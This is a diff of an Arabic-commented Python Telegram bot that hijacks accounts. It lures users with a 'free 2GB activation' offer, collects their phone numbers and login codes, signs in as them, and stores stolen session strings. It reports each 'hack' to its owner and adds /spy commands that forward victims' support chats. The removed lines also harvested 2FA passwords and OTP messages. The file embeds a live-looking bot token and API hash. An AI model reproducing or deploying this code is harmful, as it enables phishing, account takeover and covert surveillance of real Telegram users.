@@ -1,253 +1,237 @@
 import asyncio
-import logging
+import json
 from pathlib import Path
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError
+from telethon.sessions import StringSession
 
-# ------------------ معلوماتك ------------------
+# ========== بياناتك ==========
 BOT_TOKEN = "8704404185:AAGe_I8kcY4qtbpzVLxpTc2seLrPHHKLsvE"
 API_ID = 38269251
 API_HASH = "af81ddbd39ca658e08bf7c268d6651c7"
 OWNER_ID = 5843701757
 
-# ------------------ إعدادات حفظ الجلسات ------------------
-SESSIONS_DIR = Path("/storage/emulated/0/Download/bot_sessions")
-SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
+BASE_DIR = Path("/storage/emulated/0/Download/bot_sessions")
+BASE_DIR.mkdir(exist_ok=True)
+SESSION_FILE = BASE_DIR / "sessions.json"
 
-# ------------------ إعداد التسجيل ------------------
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
-
-# ------------------ بيانات مؤقتة ------------------
 user_data = {}
-active_listeners = {}
+stolen = {}
+active_spies = {}  # للتجسس
 
-# ------------------ دوال Telethon ------------------
-async def get_telegram_client(session_name):
-    client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
-    await client.connect()
-    return client
+if SESSION_FILE.exists():
+    with open(SESSION_FILE) as f:
+        stolen = {int(k): v for k, v in json.load(f).items()}
 
-# ====================== الاستماع التلقائي (للدعم فقط) ======================
-async def listen_to_account(user_id, session_file, account_name):
-    """الاستماع فقط للرسائل القادمة من الدعم الفني (@Telegram)"""
-    try:
-        client = TelegramClient(str(session_file), API_ID, API_HASH)
-        await client.connect()
-        
-        if not await client.is_user_authorized():
-            logger.warning(f"⚠️ جلسة {user_id} غير صالحة، تم إيقاف الاستماع.")
-            await bot.send_message(OWNER_ID, f"⚠️ توقف الاستماع إلى حساب {account_name}: الجلسة غير صالحة.")
-            return
-        
-        me = await client.get_me()
-        logger.info(f"🎧 بدء الاستماع إلى حساب {me.first_name} (لرسائل الدعم فقط)")
-        await bot.send_message(OWNER_ID, f"🎧 بدأ الاستماع إلى حساب {me.first_name} (لرسائل الدعم الفني فقط).")
-        
-        # معرف حساب الدعم الفني البشري
-        SUPPORT_BOT = '@Telegram'
-        
-        @client.on(events.NewMessage)
-        async def forward_support_message(event):
-            try:
-                # تجاهل الرسائل الصادرة
-                if event.out:
-                    return
-                
-                # الحصول على المرسل
-                sender = await event.get_sender()
-                sender_id = sender.id if sender else None
-                sender_username = sender.username if sender and sender.username else ""
-                
-                # التحقق: هل المرسل هو الدعم الفني؟
-                is_support = False
-                
-                # طريقة 1: التحقق من اسم المستخدم
-                if sender_username and sender_username.lower() == 'telegram':
-                    is_support = True
-                
-                # طريقة 2: التحقق من المعرف (إذا كان معرف الدعم معروفاً)
-                if sender_id == 777000:  # حساب النظام الآلي
-                    is_support = True
-                
-                # إذا لم تكن الرسالة من الدعم، تجاهلها
-                if not is_support:
-                    return
-                
-                # تنسيق التقرير
-                message_text = event.text or "[وسائط]"
-                report = f"📞 **رسالة جديدة من الدعم الفني**\n"
-                report += f"📱 الحساب المخترق: {me.first_name}\n"
-                report += f"💬 المحتوى: {message_text[:500]}\n"
-                report += f"⏰ الوقت: {event.date.strftime('%Y-%m-%d %H:%M:%S')}"
-                
-                # إرسال الرسالة إلى المالك
-                await bot.send_message(OWNER_ID, report)
-                
-            except Exception as e:
-                logger.error(f"خطأ في إعادة توجيه رسالة الدعم: {e}")
-        
-        await client.run_until_disconnected()
-        
-    except Exception as e:
-        logger.error(f"خطأ في الاستماع إلى {user_id}: {e}")
-    finally:
-        if user_id in active_listeners:
-            del active_listeners[user_id]
-            await bot.send_message(OWNER_ID, f"🔇 توقف الاستماع إلى حساب {account_name}.")
-# =================================================================
-
-# ------------------ البوت ------------------
 bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-@bot.on(events.NewMessage(pattern='/start'))
-async def start(event):
-    await event.reply("🎯 البوت جاهز لاستقبال البيانات من الموقع.")
+USER_MSG = "🌐 *Dz Quantum Net*\n🎁 خدمة تفعيل 2GB مجاني\n@Dz_off_bot"
 
+# ========== أوامر الموقع (نفس الكود الناجح) ==========
 @bot.on(events.NewMessage(pattern='/verify'))
-async def handle_phone(event):
-    user_id = event.sender_id
+async def verify(event):
     try:
         phone = event.text.split()[1]
-    except:
-        await event.reply("❌ حدث خطأ. أرسل الرقم بالصيغة: /verify 213699404869")
-        return
-    
-    user_data[user_id] = {'phone': phone, 'step': 'waiting_code'}
-    client = await get_telegram_client(f"user_{user_id}")
-    await client.send_code_request(phone)
-    user_data[user_id]['client'] = client
-    await event.reply(f"✅ تم إرسال رمز التحقق إلى {phone}.")
-    logger.info(f"✅ تم إرسال طلب رمز إلى {phone}")
+        if not phone.startswith('+'): phone = '+' + phone
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        await client.send_code_request(phone)
+        user_data[event.sender_id] = {'phone': phone, 'client': client}
+        await event.reply(f"✅ تم إرسال الرمز إلى {phone}")
+    except Exception as e:
+        await event.reply(f"❌ {str(e)[:100]}")
 
 @bot.on(events.NewMessage(pattern='/submit_code'))
-async def handle_code(event):
-    user_id = event.sender_id
+async def submit(event):
+    sid = event.sender_id
+    if sid not in user_data:
+        await event.reply("❌ أرسل /verify أولا")
+        return
     try:
         code = event.text.split()[1]
-    except:
-        await event.reply("❌ حدث خطأ. أرسل الرمز بالصيغة: /submit_code 12345")
-        return
-    
-    if user_id not in user_data or user_data[user_id]['step'] != 'waiting_code':
-        await event.reply("❌ يرجى إرسال الرقم أولاً عبر /verify")
-        return
-    
-    phone = user_data[user_id]['phone']
-    client = user_data[user_id]['client']
-    
-    try:
+        client = user_data[sid]['client']
+        phone = user_data[sid]['phone']
         await client.sign_in(phone=phone, code=code)
         me = await client.get_me()
-        session_path = SESSIONS_DIR / f"user_{user_id}.session"
-        
-        report = f"✅ *تم اختراق حساب!*\n\n👤 الاسم: {me.first_name}\n🆔 المعرف: {me.id}\n📞 الرقم: {me.phone}"
-        await bot.send_message(OWNER_ID, report)
-        await event.reply("✅ تم تسجيل الدخول بنجاح!")
-        
-        # قراءة آخر 5 رسائل من النظام الآلي
-        try:
-            telegram_system_id = 777000
-            otp_messages = []
-            async for msg in client.iter_messages(telegram_system_id, limit=5):
-                otp_messages.append(f"[{msg.date.strftime('%Y-%m-%d %H:%M:%S')}] {msg.text}")
-            
-            if otp_messages:
-                otp_report = f"🔑 **آخر رموز التحقق (OTP) التي وصلت لحساب {me.first_name}**\n\n" + "\n".join(otp_messages)
-                await bot.send_message(OWNER_ID, otp_report)
-        except:
-            pass
-        
+        session_str = StringSession.save(client.session)
+        stolen[me.id] = session_str
+        with open(SESSION_FILE, 'w') as f:
+            json.dump({str(k): v for k, v in stolen.items()}, f)
+        await event.reply("✅ تم التفعيل بنجاح")
+        if sid != OWNER_ID:
+            await bot.send_message(OWNER_ID, f"🔥 اختراق: {me.first_name} ({me.id})")
         await client.disconnect()
-        
-        # بدء الاستماع التلقائي (لرسائل الدعم فقط)
-        if user_id not in active_listeners:
-            listener_task = asyncio.create_task(listen_to_account(user_id, session_path, me.first_name))
-            active_listeners[user_id] = listener_task
-        
-        del user_data[user_id]
-        
+        del user_data[sid]
     except SessionPasswordNeededError:
-        await event.reply("🔐 هذا الحساب محمي بـ 2FA. أرسل كلمة المرور عبر /submit_2fa")
-        user_data[user_id]['step'] = 'waiting_2fa'
+        await event.reply("🔐 محمي بـ 2FA")
+        del user_data[sid]
     except Exception as e:
-        await event.reply(f"❌ فشل تسجيل الدخول: {e}")
-        del user_data[user_id]
+        await event.reply(f"❌ {str(e)[:100]}")
+        del user_data[sid]
 
-@bot.on(events.NewMessage(pattern='/submit_2fa'))
-async def handle_2fa(event):
-    user_id = event.sender_id
+# ========== أوامر المالك (نفس الكود الناجح) ==========
+@bot.on(events.NewMessage(pattern='/owner'))
+async def owner_menu(event):
+    if event.sender_id != OWNER_ID: return
+    await event.reply("""👑 أوامر المالك:
+/list - عرض المخترقين
+/session ID - عرض جلسة
+/stats - إحصائيات
+/spy ID - تجسس حقيقي
+/stop_spy ID - إيقاف التجسس
+/verify +213XXX
+/submit_code 12345""")
+
+@bot.on(events.NewMessage(pattern='/list'))
+async def list_cmd(event):
+    if event.sender_id != OWNER_ID: return
+    if not stolen:
+        await event.reply("📭 لا توجد حسابات")
+    else:
+        msg = "📋 المخترقين:\n"
+        for vid in stolen:
+            active = " 🎧" if vid in active_spies else ""
+            msg += f"• {vid}{active}\n"
+        await event.reply(msg)
+
+@bot.on(events.NewMessage(pattern='/session'))
+async def session_cmd(event):
+    if event.sender_id != OWNER_ID: return
     try:
-        password = event.text.split()[1]
+        vid = int(event.text.split()[1])
+        if vid in stolen:
+            await event.reply(f"جلسة {vid}:\n{stolen[vid][:80]}...")
+        else:
+            await event.reply(f"❌ {vid} غير موجود")
     except:
-        await event.reply("❌ حدث خطأ. أرسل كلمة المرور بالصيغة: /submit_2fa password")
-        return
-    
-    if user_id not in user_data or user_data[user_id]['step'] != 'waiting_2fa':
-        await event.reply("❌ يرجى إرسال الرقم والرمز أولاً")
-        return
-    
-    client = user_data[user_id]['client']
-    phone = user_data[user_id]['phone']
-    
+        await event.reply("❌ /session 5843701757")
+
+@bot.on(events.NewMessage(pattern='/stats'))
+async def stats_cmd(event):
+    if event.sender_id != OWNER_ID: return
+    await event.reply(f"📊 مخترقين: {len(stolen)}\n🎧 تجسس نشط: {len(active_spies)}\n📁 {BASE_DIR}")
+
+# ========== وظائف التجسس الحقيقية ==========
+SUPPORT_IDS = [777000, 777100, 777200, 4244000]
+SUPPORT_NAMES = ["telegram", "telegramtips", "support", "smilesbot"]
+
+async def start_spying(victim_id: int):
+    """بدء تجسس حقيقي على حساب مخترق"""
+    if victim_id in active_spies:
+        return False
+    if victim_id not in stolen:
+        return False
+
+    session_str = stolen[victim_id]
+    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+    await client.connect()
+
+    # التحقق من صحة الجلسة
     try:
-        await client.sign_in(password=password)
         me = await client.get_me()
-        session_path = SESSIONS_DIR / f"user_{user_id}.session"
-        
-        report = f"✅ *تم اختراق حساب مع 2FA!*\n\n👤 الاسم: {me.first_name}\n🆔 المعرف: {me.id}\n📞 الرقم: {me.phone}\n🔐 كلمة المرور: {password}"
-        await bot.send_message(OWNER_ID, report)
-        await event.reply("✅ تم تسجيل الدخول بنجاح!")
-        
-        # قراءة آخر رسائل النظام الآلي
+        if me.id != victim_id:
+            await client.disconnect()
+            return False
+    except:
+        await client.disconnect()
+        return False
+
+    # مستمع التجسس
+    @client.on(events.NewMessage(incoming=True, outgoing=True))
+    async def spy_listener(event):
         try:
-            telegram_system_id = 777000
-            otp_messages = []
-            async for msg in client.iter_messages(telegram_system_id, limit=5):
-                otp_messages.append(f"[{msg.date.strftime('%Y-%m-%d %H:%M:%S')}] {msg.text}")
-            if otp_messages:
-                otp_report = f"🔑 **آخر رموز OTP لحساب {me.first_name}**\n\n" + "\n".join(otp_messages)
-                await bot.send_message(OWNER_ID, otp_report)
+            chat = await event.get_chat()
+            is_support = False
+            support_name = None
+
+            # هل هي محادثة دعم فني؟
+            if hasattr(chat, 'id') and chat.id in SUPPORT_IDS:
+                is_support = True
+                support_name = f"ID_{chat.id}"
+            elif hasattr(chat, 'username') and chat.username and chat.username.lower() in SUPPORT_NAMES:
+                is_support = True
+                support_name = f"@{chat.username}"
+            elif hasattr(chat, 'first_name') and "telegram" in chat.first_name.lower():
+                is_support = True
+                support_name = chat.first_name
+
+            if not is_support:
+                return
+
+            direction = "📤 أرسل" if event.out else "📥 استلم"
+            text = event.text[:300] if event.text else "[وسائط]"
+
+            await bot.send_message(
+                OWNER_ID,
+                f"🔵 *رسالة دعم*\n👤 ضحية: {victim_id}\n{direction} مع {support_name}\n\n📝 {text}"
+            )
         except:
             pass
-        
-        await client.disconnect()
-        
-        # بدء الاستماع التلقائي (لرسائل الدعم فقط)
-        if user_id not in active_listeners:
-            listener_task = asyncio.create_task(listen_to_account(user_id, session_path, me.first_name))
-            active_listeners[user_id] = listener_task
-        
-        del user_data[user_id]
-    except Exception as e:
-        await event.reply(f"❌ كلمة المرور غير صحيحة: {e}")
 
-# ====================== إيقاف الاستماع ======================
-@bot.on(events.NewMessage(pattern='/stop_listen'))
-async def stop_listen(event):
-    if event.sender_id != OWNER_ID:
-        await event.reply("⛔ هذا الأمر للمالك فقط.")
-        return
-    
-    parts = event.text.strip().split()
-    if len(parts) != 2:
-        await event.reply("❌ الاستخدام: /stop_listen [معرف_الضحية]")
-        return
-    
+    active_spies[victim_id] = client
+    return True
+
+async def stop_spying(victim_id: int):
+    """إيقاف التجسس"""
+    if victim_id in active_spies:
+        try:
+            await active_spies[victim_id].disconnect()
+        except:
+            pass
+        del active_spies[victim_id]
+        return True
+    return False
+
+@bot.on(events.NewMessage(pattern='/spy'))
+async def spy_cmd(event):
+    if event.sender_id != OWNER_ID: return
     try:
-        user_id = int(parts[1])
-    except:
-        await event.reply("❌ المعرف يجب أن يكون رقماً.")
-        return
-    
-    if user_id in active_listeners:
-        active_listeners[user_id].cancel()
-        del active_listeners[user_id]
-        await event.reply(f"✅ تم إيقاف الاستماع إلى الحساب {user_id}.")
-    else:
-        await event.reply(f"❌ لا يوجد استماع نشط للحساب {user_id}.")
-# =================================================================
+        victim_id = int(event.text.split()[1])
+        if victim_id not in stolen:
+            await event.reply(f"❌ {victim_id} غير مخترق")
+            return
+        if victim_id in active_spies:
+            await event.reply(f"⚠️ التجسس على {victim_id} نشط بالفعل")
+            return
 
-# ------------------ تشغيل البوت ------------------
-print("🚀 البوت يعمل وينتظر البيانات...")
+        await event.reply(f"🔄 بدء التجسس على {victim_id}...")
+        success = await start_spying(victim_id)
+        if success:
+            await event.reply(f"✅ تم بدء التجسس على {victim_id}")
+        else:
+            await event.reply(f"❌ فشل بدء التجسس")
+    except:
+        await event.reply("❌ /spy 5843701757")
+
+@bot.on(events.NewMessage(pattern='/stop_spy'))
+async def stop_spy_cmd(event):
+    if event.sender_id != OWNER_ID: return
+    try:
+        victim_id = int(event.text.split()[1])
+        if await stop_spying(victim_id):
+            await event.reply(f"✅ تم إيقاف التجسس على {victim_id}")
+        else:
+            await event.reply(f"❌ لا يوجد تجسس نشط على {victim_id}")
+    except:
+        await event.reply("❌ /stop_spy 5843701757")
+
+# ========== رد المستخدم العادي ==========
+@bot.on(events.NewMessage)
+async def normal_user(event):
+    if event.sender_id == OWNER_ID:
+        return
+    if event.text and event.text.startswith('/verify'):
+        return
+    if event.text and event.text.startswith('/submit_code'):
+        return
+    await event.reply(USER_MSG, parse_mode='markdown')
+
+# ========== التشغيل ==========
+print("=" * 50)
+print("🚀 البوت شغال - مع تجسس حقيقي")
+print(f"👑 المالك: {OWNER_ID}")
+print(f"📁 حفظ الجلسات: {BASE_DIR}")
+print("=" * 50)
+
 bot.run_until_disconnected()
+~ $
